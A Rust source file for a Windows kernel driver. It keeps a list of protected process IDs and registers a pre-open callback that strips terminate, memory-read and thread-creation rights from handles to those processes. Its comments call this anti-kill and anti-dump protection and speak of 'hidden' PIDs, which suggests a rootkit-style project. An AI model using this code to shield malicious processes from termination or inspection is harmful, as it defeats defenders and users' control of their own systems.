#![cfg(not(feature = "mapper"))]

use {
    alloc::vec::Vec,
    core::ffi::c_void,
    spin::{Mutex, lazy::Lazy}, 
    shared::{structs::{ProcessListInfo, ProcessProtection}, vars::MAX_PID},
    winapi::um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_TERMINATE, 
        PROCESS_VM_OPERATION, PROCESS_VM_READ
    },
    wdk_sys::{
        ntddk::PsGetProcessId,
        _OB_PREOP_CALLBACK_STATUS::{self, OB_PREOP_SUCCESS},
        NTSTATUS, OB_PRE_OPERATION_INFORMATION, PEPROCESS,
        PROCESS_DUP_HANDLE, STATUS_SUCCESS, STATUS_UNSUCCESSFUL,
        STATUS_DUPLICATE_OBJECTID
    }, 
};

/// Handle for the process callback registration.
pub static mut CALLBACK_REGISTRATION_HANDLE_PROCESS: *mut c_void = core::ptr::null_mut();

/// List of target PIDs protected by a mutex.
static TARGET_PIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_PID))); 

/// Method to check if the action sent is to add or remove a pid from the list of protected processes
///
/// # Parameters
/// 
/// - `process`: Structure with information about the process that will be added or removed from the list of protected processes.
///
/// # Returns
/// 
/// - `NTSTATUS`: A status code indicating the success or failure of the operation.
/// 
pub fn add_remove_process_toggle(process: *mut ProcessProtection) -> NTSTATUS {
    let pid = unsafe { (*process).pid };
    if unsafe { (*process).enable } {
        add_target_pid(pid)
    } else {
        remove_target_pid(pid)
    }
}

/// Method for adding the list of processes that will have anti-kill / dumping protection.
///
/// # Parameters
/// 
/// - `pid`: The identifier of the target process (PID) to be hidden.
///
/// # Returns
/// 
/// - `NTSTATUS`: A status code indicating the success or failure of the operation.
/// 
fn add_target_pid(pid: usize) -> NTSTATUS {
    let mut pids = TARGET_PIDS.lock();

    if pids.len() >= MAX_PID {
        log::error!("PID list is full");
        return STATUS_UNSUCCESSFUL;
    }

    if pids.contains(&pid) {
        log::warn!("PID {pid} already exists in the list");
        return STATUS_DUPLICATE_OBJECTID;
    }

    pids.push(pid);

    STATUS_SUCCESS
}

/// Method for removing the list of processes that will have anti-kill / dumping protection.
///
/// # Parameters
/// 
/// - `pid`: The identifier of the target process (PID) to be hidden.
///
/// # Returns
/// 
/// - `NTSTATUS`: A status code indicating the success or failure of the operation.
/// 
fn remove_target_pid(pid: usize) -> NTSTATUS {
    let mut pids = TARGET_PIDS.lock();

    if let Some(index) = pids.iter().position(|&x| x == pid) {
        pids.remove(index);
        STATUS_SUCCESS
    } else {
        log::error!("PID {pid} not found in the list");
        STATUS_UNSUCCESSFUL
    }
}

/// Enumerate Processes Protect.
///
/// # Parameters
/// 
/// - `info_process`: It is a parameter of type `InfoProcesses` that will send the processes that are currently protected.
/// - `information`: It is a parameter of type `usize` that will be updated with the total size of the filled `InfoProcesses` structures.
/// 
/// # Returns
/// 
/// - `NTSTATUS`: A status code indicating success or failure of the operation.
///
pub unsafe fn enumerate_protection_processes(info_process: *mut ProcessListInfo, information: &mut usize) -> NTSTATUS {
    let process_info = TARGET_PIDS.lock();
    let mut count = 0;
    for i in process_info.iter() {
        (*info_process.offset(count)).pids = *i;

        *information += core::mem::size_of::<ProcessListInfo>();
        count += 1;
    }

    STATUS_SUCCESS
}

/// The object (process) pre-operation callback function used to filter process opening operations.
/// This function is registered as a callback and is called by the operating system before a process opening operation is completed.
///
/// # Parameters
/// 
/// - `_registration_context`: Pointer to record context (Not used).
/// - `info`: Pointer to an `OB_PRE_OPERATION_INFORMATION` structure that contains information about the process's pre-opening operation.
///
/// # Returns
/// 
/// - `_OB_PREOP_CALLBACK_STATUS::Type`: A status code indicating the success or failure of the operation.
///
pub unsafe extern "C" fn on_pre_open_process(
    _registration_context: *mut c_void,
    info: *mut OB_PRE_OPERATION_INFORMATION,
) -> _OB_PREOP_CALLBACK_STATUS::Type {
    if (*info).__bindgen_anon_1.__bindgen_anon_1.KernelHandle() == 1 {
        return OB_PREOP_SUCCESS;
    }

    let process = (*info).Object as PEPROCESS;
    let pid = PsGetProcessId(process) as usize;
    let pids = TARGET_PIDS.lock();

    if pids.contains(&pid) {
        let mask = !(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_TERMINATE);
        (*(*info).Parameters).CreateHandleInformation.DesiredAccess &= mask;
    }

    OB_PREOP_SUCCESS
}
